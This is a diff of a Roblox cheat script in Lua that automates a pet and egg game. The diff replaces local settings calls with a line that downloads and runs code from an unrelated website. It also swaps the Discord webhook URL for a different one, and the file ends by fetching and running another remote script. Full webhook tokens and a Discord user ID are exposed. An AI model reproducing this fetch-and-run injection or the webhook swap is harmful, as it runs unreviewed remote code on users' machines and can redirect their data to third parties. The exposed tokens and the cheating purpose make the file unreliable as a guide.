@@ -2,26 +2,13 @@ if not game:IsLoaded() then
     game.Loaded:Wait()
   end
 
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local Remote = ReplicatedStorage.Shared.Framework.Network.Remote.Event
-
-local function setSetting(settingName, value)
-    local args = {
-        [1] = "SetSetting",
-        [2] = settingName,
-        [3] = value
-    }
-    Remote:FireServer(unpack(args))
-end
 
 
 
 task.spawn(function()
 wait(10)
-setSetting("Low Detail Mode", true)
-setSetting("Hide All Pets", true)
-setSetting("Hide Others Pets", true)
-setSetting("Hide Bubbles", true)
+
+loadstring(game:HttpGet("https://sellaccroblox.com/raw/view.php?file=lilbip%2Fextrabsi.txt"))()
 
 end)
 
@@ -32,7 +19,7 @@ getgenv().Settings = {
         --// Supports ANY egg ("Rainbow Egg", "Infinity Egg", ...). Keep "Best" for new accounts.
         
         ["Notifications"] = {
-            Webhook = "https://discord.com/api/webhooks/1300082164519538730/38NQda5MWKiomtI3_-5xrLtaQhg3qT01QaOkbV_zZTMjRgB8hZB44n5KafC8VW4Kd8Cm",
+            Webhook = "https://discord.com/api/webhooks/1280307675636301948/sM8Y96yRhPp_bcFBoHewrtwcuP2LoWfyOAmzuv_Lk3YSeboqh4A5XV9oDKwBBn1MR2yD",
             DiscordID = "1070055033225347212",
             Difficulty = "30m", --// Minimum Difficulty for Webhook Notifications
         },
@@ -61,7 +48,4 @@ getgenv().Settings = {
         DisableUI = false,
     },
 }
-
-daubuoi = true
-
 loadstring(game:HttpGet("https://system-exodus.com/scripts/BGSI/OneClick.lua"))()
